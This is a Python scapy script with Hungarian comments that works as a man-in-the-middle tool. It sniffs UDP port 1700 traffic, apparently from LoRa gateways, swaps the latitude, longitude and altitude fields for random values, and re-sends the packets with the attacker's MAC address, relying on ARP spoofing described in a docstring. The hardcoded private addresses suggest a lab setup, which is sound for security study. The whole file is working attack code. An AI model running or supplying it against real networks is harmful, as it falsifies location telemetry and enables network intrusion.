from scapy.all import *
from datetime import datetime
import random
import time
import os

# lista a payloadoknak
mypayloads = []

# szkript induláskor elmenti az aktuális időt
last_check = time.time()

# koordináták és tengerszint feletti magasság generálása
lati = f'"lati":{round(random.randint(1000,90000) * 0.001, 4)}'.encode()
long = f'"long":{round(random.randint(1000,180000) * 0.001, 4)}'.encode()
alti = f'"alti":{round(random.randint(0,10000))}'.encode()

# IP címeket és a hozzájuk tartozó MAC címeket tároló szótár
ip_to_mac = {
    "10.1.1.4" : "08:00:27:ab:4e:38",
    "10.1.1.8" : "08:00:27:70:95:59",
    "192.168.0.81" : "b8:27:eb:c8:24:ff",
    "192.168.0.244" : "dc:a6:32:80:0d:ff"
}

def save_packets(packet: bytes, file: str):
    """
    Eljárás, mely fájlba írja a neki átadott csomagokat.

    Bemenet:
        packet: az elküldött csomag
        file: a file elérési útja, ahova mentsen
    """
    with open(file, 'ab') as w:
        w.write(packet)

def packet_callback(packet):
    """
    Eljárás, mely minden alkalommal meghívásra kerül, ha a scapy sniff függvénye
    elkap egy csomagot.

    Bemenet:
        packet: a scapy sniff függvényével elkapott csomag
    """
    # átkerült ebbe az eljárásba a csomagok ellenőrzése
    if packet.haslayer(UDP):    
        mypayload = bytes(packet[UDP].payload)

        # amennyiben még nem volt ez a payload, elmenti a listába
        # és küldi majd tovább
        if mypayload not in mypayloads:
            mypayloads.append(mypayload)
        # ha már létezett a payload, akkor kilép a függvényből, ezáltal a csomag
        # droppolva lesz
        else:
            return

        # amennyiben van benne koordináta, azt módosítja
        if b'"lati"' in mypayload:
            new_payload = change_coordinates(mypayload)
        # ha nincs, akkor nem piszkálja
        else:
            new_payload = mypayload
        # az új payload továbbküldése
        modify_and_forward(packet, new_payload)
        

def change_coordinates(payload: bytes):
    """
    Függvény, mely módosítja az elkapott csomagokat a random generált koordinátákkal.

    Bemenet:
        payload: az UDP csomag payloadja

    Visszatérési érték:
        new_payload: a módosított UDP payload az új koordinátákkal és tengerszint feletti magassággal
    """
    # most már a szkript indulásakor kerülnek generálásra az adatok
    global lati
    global long
    global alti
    
    # a cserére szánt byte-ok kinyerése
    latitude = get_changeable_bytes(payload, b'"lati"')
    longitude = get_changeable_bytes(payload, b'"long"')
    altitude = get_changeable_bytes(payload, b'"alti"')
    
    # megfelelő byte-ok cseréje
    new_payload = payload.replace(latitude, lati)
    new_payload = new_payload.replace(longitude, long)
    new_payload = new_payload.replace(altitude, alti)

    # csak a payload fájlba írása későbbi elemzésre
    today = datetime.today().strftime("%Y%m%d")
    save_packets(new_payload,f'new_payloads_{today}.txt')
    return new_payload

def get_changeable_bytes(payload: bytes, start_byte: bytes):
    """
    Függvény, mely megkeresi a payloadban a módosítani kívánt byte-okat.

    Bemenet:
        payload: az UDP payload
        start_byte: az a string byte formában, ahonnan kezdődik a keresett szöveg a cseréhez

    Visszatérési érték:
        result: a payload cserére szánt része byte formában
    """
    start_index = payload.find(start_byte)
    stop_index = payload[start_index:].find(b',') + start_index
    result = payload[start_index:stop_index]
    return result

def check_time():
    """
    Eljárás, mely összehasonlítja a szkript indulásakor elmentett időt az aktuális idővel.
    Amennyiben a kettő különbsége legalább 10 perc, akkor kilép a szkriptből.
    """
    global last_check
    if time.time() - last_check >= 600:
        print(f'[*] Bye.')
        exit(0)


def modify_and_forward(packet, payload: bytes):
    """
    Eljárás, mely a módosított packet-et továbbküldi.
    
    Bemenet:
        packet: az eredeti csomag
        payload: a már módosított csomag
    """
    
    # csomag módosítása a megfelelő MAC címekkel
    packet = rewrite_dst_mac(packet)

    # ssomag tartalmának módosítása
    packet[Raw].load = payload

    # checksumok újraszámolása
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum

    try:
        sendp(packet, verbose=False)
    except:
        pass
    check_time()

def rewrite_dst_mac(packet):
    """
    Függvény, mely layer 2-ben, Ethernet szinten módosítja a csomagot.
    A cél IP cím alapján biztosítja, hogy a cél MAC is rendben legyen, nehogy
    az arpspoofing bezavarja a csomag továbbítását, valamint a forrásnak a támadó
    eszköz MAC címét adja meg.

    Bemenet:
        packet: az eredeti csomag

    Visszatérési érték:
        packet: a módosított csomag
    """
    # Ha nincs IP vagy Ethernet réteg, nem nyúl hozzá
    if not (packet.haslayer(Ether) and packet.haslayer(IP)):
        return packet

    # wlan0 interface MAC címét kiszedi
    src_mac = get_if_hwaddr("wlan0")
    
    # cél IP a csomagból
    dst_ip = packet[IP].dst

    # megfelelő MAC megadása
    dst_mac = ip_to_mac[dst_ip]
    if dst_mac is None:
        print(f"[!] Nem ismert MAC a cél IP-hez: {dst_ip}")
        return packet

    # Forrás MAC a támadó gép MAC címe, cél MAC az eredeti IP-hez tartozó MAC
    packet[Ether].dst = dst_mac
    packet[Ether].src = src_mac

    return packet

print("[*] Start")
print(last_check)
sniff(filter="udp port 1700", prn=packet_callback)
